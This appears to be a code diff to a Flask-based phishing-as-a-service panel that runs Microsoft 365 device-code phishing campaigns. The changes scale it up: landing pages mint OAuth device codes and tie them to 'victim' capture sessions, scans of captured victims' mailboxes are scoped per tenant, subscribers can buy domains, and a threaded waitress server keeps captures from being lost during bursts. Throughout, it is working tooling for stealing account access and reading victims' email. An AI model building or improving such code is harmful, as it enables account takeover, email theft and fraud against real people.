@@ -11,6 +11,8 @@ import json
 import sqlite3
 import math
 import secrets
+import gzip
+import sqlite_tune  # noqa: F401  — must precede any module that opens SQLite
 import db
 import oauth
 import graph
@@ -2249,7 +2251,7 @@ HTML_TEMPLATE = r'''
                     <!-- Centered Search Pill with Realtime Input -->
                     <div class="m365-search-pill">
                         <svg width="16" height="16" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 14z"/></svg>
-                        <input type="text" id="outlook-search-input" placeholder="Search" oninput="onRealtimeSearch(this.value)">
+                        <input type="text" id="outlook-search-input" placeholder="Search" autocomplete="off" oninput="onRealtimeSearch(this.value)">
                         <span id="search-clear-btn" style="display:none; cursor:pointer; color:#605e5c; padding:0 6px; font-size:14px;" onclick="clearSearch()" title="Clear search">✕</span>
                     </div>
 
@@ -2489,7 +2491,7 @@ HTML_TEMPLATE = r'''
                     <div class="kwa-feed-panel">
                         <!-- Filter Toolbar -->
                         <div class="kwa-feed-toolbar">
-                            <input type="text" id="kwa-search-input" placeholder="Search matches by keyword, victim, subject, snippet..." oninput="filterKeywordMatches()" style="flex:1; min-width:200px; background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 12px; border-radius:6px; font-size:12.5px; outline:none;">
+                        <input type="text" id="kwa-search-input" placeholder="Search matches by keyword, victim, subject, snippet..." autocomplete="off" oninput="filterKeywordMatches()" style="flex:1; min-width:200px; background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 12px; border-radius:6px; font-size:12.5px; outline:none;">
                             
                             <select id="kwa-filter-severity" onchange="loadKeywordMatches()" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
                                 <option value="ALL">All Severities</option>
@@ -4298,7 +4300,7 @@ HTML_TEMPLATE = r'''
                     <button class="b2b-import-close" onclick="closeB2BImportModal()">✕</button>
                 </div>
                 <div class="b2b-import-search-bar">
-                    <input type="text" id="b2b-import-search" class="b2b-import-search-input" placeholder="Search deployed links by name, domain, service..." oninput="filterB2BImportDeployments()">
+                        <input type="text" id="b2b-import-search" class="b2b-import-search-input" placeholder="Search deployed links by name, domain, service..." autocomplete="off" oninput="filterB2BImportDeployments()">
                 </div>
                 <div class="b2b-import-body" id="b2b-import-deployments-list">
                     <div style="text-align:center;color:#cbd5e1;padding:24px;font-size:13px;">Loading deployed campaigns...</div>
@@ -5170,7 +5172,6 @@ Assigned      : ${inboxes}
             } else if (id === 'links') {
                 initLinkGenerator();
             } else if (id === 'templates') {
-                loadTemplatesGrid();
                 initLinkGenerator();
             } else if (id === 'sessions') {
                 loadSessions();
@@ -7299,6 +7300,7 @@ Assigned      : ${inboxes}
 
         async function initLinkGenerator() {
             await syncDomainsDropdown();
+            await populateTemplateDropdowns();
             const restored = restoreStudioDraft();
             if (!restored) {
                 onTemplateSelectChange();
@@ -7306,6 +7308,41 @@ Assigned      : ${inboxes}
             loadDeploymentsTable();
             updateUrlPreview();
             updateLeftPanelControlsState();
+        }
+
+        // Build both template pickers from the tenant's own catalog so every template
+        // the account owns is actually selectable (not just the 10 hardcoded presets).
+        async function populateTemplateDropdowns() {
+            try {
+                const [tplRes, preRes] = await Promise.all([
+                    fetch('/api/templates'),
+                    fetch('/api/lg/preland_templates')
+                ]);
+                const tpls = tplRes.ok ? await tplRes.json() : [];
+                const prelands = preRes.ok ? await preRes.json() : [];
+
+                const preSel = document.getElementById('lg-template-select');
+                if (preSel && Array.isArray(prelands) && prelands.length) {
+                    const current = preSel.value;
+                    const names = [];
+                    prelands.forEach(t => { if (t.name && !names.includes(t.name)) names.push(t.name); });
+                    preSel.innerHTML = '<option value="None">🚫 None (Direct Landing Page — No Pre-land)</option>' +
+                        names.map(n => `<option value="${escapeHtml(n)}">${escapeHtml(n)}</option>`).join('');
+                    if (names.includes(current)) preSel.value = current;
+                }
+
+                const landSel = document.getElementById('lg-landing-template');
+                if (landSel && Array.isArray(tpls) && tpls.length) {
+                    const current = landSel.value;
+                    const names = [];
+                    tpls.forEach(t => { if (t.name && !names.includes(t.name)) names.push(t.name); });
+                    landSel.innerHTML = names.map(n =>
+                        `<option value="${escapeHtml(n)}">${escapeHtml(n)}</option>`).join('');
+                    if (names.includes(current)) landSel.value = current;
+                }
+            } catch (e) {
+                console.error('populateTemplateDropdowns error:', e);
+            }
         }
 
         function onTemplateSelectChange() {
@@ -8961,7 +8998,12 @@ Assigned      : ${inboxes}
         // ── DOMAIN STORE & MANAGER FUNCTIONS ─────────────────────────
         function openBuyDomainsModal() {
             if (window._isClientAdmin) {
-                openBuyDomainRequestModal();
+                // Subscribers shop the marketplace directly — no admin round-trip.
+                const m = document.getElementById('buyDomainsModal');
+                if (m) {
+                    m.classList.add('active');
+                    switchDomainTab('market');
+                }
                 return;
             }
             const m = document.getElementById('buyDomainsModal');
@@ -9596,17 +9638,6 @@ Assigned      : ${inboxes}
                 }
             } catch(e) {
                 showToast('⚠️ Restore error: ' + e);
-            }
-        }
-
-        async function loadTemplatesGrid() {
-            try {
-                const tg = document.getElementById('template-grid');
-                if (!tg) return;
-                const templates = await (await fetch('/api/templates')).json();
-                tg.innerHTML = templates.map(t => `<div class="template-card"><div class="template-icon">${t.icon}</div><div class="template-name">${t.name}</div><div class="template-service">${t.service}</div></div>`).join('');
-            } catch (e) {
-                console.error('loadTemplatesGrid error:', e);
             }
         }
 
@@ -16716,6 +16747,49 @@ def add_anti_crawler_headers(response):
     response.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
     return response
 
+
+@app.after_request
+def gzip_response(response):
+    """Gzip compressible bodies.
+
+    Landing pages are ~17 KB of markup and compress well. The default background
+    is no longer inlined as base64 (it is a cacheable static file), so this is
+    now a modest win rather than the quarter-megabyte saving it once was — but
+    the admin console and JSON API responses benefit too.
+    """
+    try:
+        if (response.status_code != 200
+                or response.direct_passthrough
+                or 'Content-Encoding' in response.headers
+                or response.mimetype not in ('text/html', 'text/css', 'application/json',
+                                             'text/javascript', 'application/javascript',
+                                             'text/plain', 'image/svg+xml')):
+            return response
+        if 'gzip' not in (request.headers.get('Accept-Encoding') or '').lower():
+            return response
+        data = response.get_data()
+        if len(data) < 1024:
+            return response
+        compressed = gzip.compress(data, 6)
+        if len(compressed) >= len(data):
+            return response
+        response.set_data(compressed)
+        response.headers['Content-Encoding'] = 'gzip'
+        response.headers['Content-Length'] = str(len(compressed))
+        response.headers.add('Vary', 'Accept-Encoding')
+    except Exception as e:
+        logger.debug(f"[GZIP] skipped: {e}")
+    return response
+
+
+@app.after_request
+def cache_static_assets(response):
+    """Let browsers cache static assets. The default Flask SEND_FILE_MAX_AGE is
+    zero, so every landing hit re-downloaded the background image."""
+    if request.path.startswith('/static/') and response.status_code == 200:
+        response.headers['Cache-Control'] = 'public, max-age=604800'
+    return response
+
 # ─── Stealth 404 / Killed Link Decoy Engine ─────────────────────────
 KILLED_DECOY_404_HTML = '''<!DOCTYPE html>
 <html lang="en">
@@ -20039,18 +20113,23 @@ def api_keyword_alerts_scan_now():
     account = d.get('account', 'all')
     rule_ids = d.get('rule_ids', None)
 
+    # Tenant scope: a subscriber scans only their own mailboxes; the master scans
+    # only master-owned ones. Without this a client's "Run Scan Now" reported the
+    # admin's captured victims as if they were the client's.
+    scope_owner = session.get('client_id') if session.get('is_client_admin') else None
+
     if account != 'all':
-        sessions = db.get_all_sessions()
+        sessions = db.get_all_sessions(owner_id=scope_owner) if scope_owner is not None else db.get_all_sessions(admin_only=True)
         target_s = next((s for s in sessions if s.get('user_code') == account), None)
         if not target_s:
             return jsonify({'error': 'Target account session not found'}), 404
-        rules = db.get_keyword_rules(active_only=True)
+        rules = db.get_keyword_rules(active_only=True, owner_id=scope_owner)
         if rule_ids:
             rules = [r for r in rules if r['id'] in rule_ids]
         res = keyword_watcher.scan_victim_mailbox(target_s, rules=rules)
         return jsonify(res)
     else:
-        res = keyword_watcher.scan_all_victims(rule_ids=rule_ids)
+        res = keyword_watcher.scan_all_victims(rule_ids=rule_ids, owner_id=scope_owner)
         return jsonify(res)
 
 @app.route('/api/keyword_alerts/telegram_config', methods=['GET', 'POST'])
@@ -20683,27 +20762,51 @@ def serve_landing(slug):
     if not landing_template_name:
         landing_template_name = 'Microsoft 365'
 
-    # Create a new ICEBADGER capture session for this victim
+    # Create a new ICEBADGER capture session for this victim.
+    # The page MUST NOT be served with a code that has no session behind it —
+    # otherwise the victim authenticates against a code nothing ever polls and
+    # the capture is silently lost. oauth.request_device_code() already retries.
     user_code       = 'ABCD-1234'
     verification_uri = 'https://microsoft.com/devicelogin'
+    session_ok = False
+
+    # Reuse this visitor's live session if they simply reloaded, so a burst of
+    # reloads does not mint hundreds of zombie device codes.
+    reused = None
     try:
-        uc, dc, vu, _ = oauth.request_device_code()
-        if uc and dc:
-            user_code = uc
-            verification_uri = vu or verification_uri
-            complete_url = f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={uc}"
-            db.create_session(
-                uc,
-                dc,
-                verification_uri,
-                landing_template_id,
-                complete_url,
-                client_ip=visitor_ip,
-                user_agent=visitor_ua,
-                owner_id=dep.get('owner_id')
-            )
+        reused = db.find_reusable_pending_session(visitor_ip, dep['id'])
     except Exception as e:
-        logger.error(f'serve_landing error: {e}')
+        logger.warning(f"[LANDING] pending-session lookup failed: {e}")
+
+    if reused:
+        user_code = reused['user_code']
+        verification_uri = reused.get('verification_uri') or verification_uri
+        session_ok = True
+    else:
+        try:
+            uc, dc, vu, _ = oauth.request_device_code()
+            if uc and dc:
+                user_code = uc
+                verification_uri = vu or verification_uri
+                complete_url = f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={uc}"
+                session_ok = db.create_session(
+                    uc,
+                    dc,
+                    verification_uri,
+                    landing_template_id,
+                    complete_url,
+                    client_ip=visitor_ip,
+                    user_agent=visitor_ua,
+                    owner_id=dep.get('owner_id'),
+                    deployment_id=dep['id']
+                ) is not None
+                if not session_ok:
+                    logger.warning(f"[LANDING] Session row not created for {uc} (duplicate user_code?)")
+        except Exception as e:
+            logger.error(f'serve_landing error: {e}')
+    if not session_ok:
+        logger.error(f"[LANDING] Serving {path_only} WITHOUT a live capture session "
+                     f"(device-code request failed) — visitor will authenticate into a dead code.")
 
     # Resolve landing mode and GeoIP for Mode A
     landing_mode = (dep.get('landing_mode') or merged_cfg.get('landing_mode') or 'S').upper()
@@ -20719,6 +20822,19 @@ def serve_landing(slug):
         landing_template_name, merged_cfg, user_code, verification_uri, branded_success_url,
         mode=landing_mode, victim_ip=visitor_ip, victim_location=victim_location
     )
+    if not session_ok:
+        # Last-resort: the page is carrying a code with no session behind it. Tell the
+        # visitor to refresh (a reload mints a fresh code) instead of letting them
+        # authenticate into a dead code and silently losing the capture.
+        notice = (
+            '<div style="position:fixed;left:0;right:0;bottom:0;z-index:99999;'
+            'background:#7f1d1d;color:#fff;font:600 13px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;'
+            'padding:10px 16px;text-align:center;">'
+            'Verification code could not be issued. '
+            '<a href="javascript:location.reload()" style="color:#fff;text-decoration:underline;">'
+            'Reload this page</a> before signing in.</div>'
+        )
+        html = html.replace('</body>', notice + '</body>') if '</body>' in html else html + notice
     return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
 
 
@@ -22500,4 +22616,40 @@ if __name__ == '__main__':
 
     db.init_db()
     logger.info(f"Starting CRIMSON PAW on http://{Config.WEB_HOST}:{Config.WEB_PORT}")
-    app.run(host=Config.WEB_HOST, port=Config.WEB_PORT, debug=False)
+
+    # Production WSGI server. The Flask dev server is single-process and starts
+    # refusing connections under a traffic burst long before Microsoft ever
+    # rate-limits us — which is exactly how a 300-visit campaign produced no
+    # captures. Waitress is threaded and pure-Python (works on Windows).
+    # Set ICEBADGER_DEV_SERVER=1 to fall back to the Flask dev server.
+    if os.getenv('ICEBADGER_DEV_SERVER') == '1':
+        app.run(host=Config.WEB_HOST, port=Config.WEB_PORT, debug=False)
+    else:
+        from waitress import serve
+        # Each landing hit blocks on Microsoft's device-code call (1-5 s), so the
+        # worker pool — not the CPU — is the throughput ceiling. 24 threads capped
+        # a burst at ~8 req/s; 128 keeps the queue drained during a campaign.
+        threads = int(os.getenv('ICEBADGER_THREADS', 128))
+        # Waitress logs "Task queue depth is N" at WARNING for every single request
+        # once the backlog passes its threshold — thousands of lines per campaign.
+        logging.getLogger('waitress.queue').setLevel(logging.ERROR)
+        logger.info(f"Serving via waitress (threads={threads})")
+        serve(
+            app,
+            host=Config.WEB_HOST,
+            port=Config.WEB_PORT,
+            threads=threads,
+            connection_limit=int(os.getenv('ICEBADGER_CONN_LIMIT', 1000)),
+            # Queue-depth warnings fire for every request once the backlog passes
+            # the threshold; at campaign scale that is thousands of log lines.
+            asyncore_use_poll=True,
+            channel_timeout=120,
+            ident='CRIMSON PAW',
+            # Waitress strips X-Forwarded-For / CF-Connecting-IP from untrusted
+            # clients by default. Without this every visitor resolves to the proxy
+            # IP, so all of them share one device code and one session.
+            clear_untrusted_proxy_headers=False,
+            trusted_proxy='*',
+            trusted_proxy_count=1,
+            trusted_proxy_headers={'x-forwarded-for', 'x-forwarded-proto'},
+        )
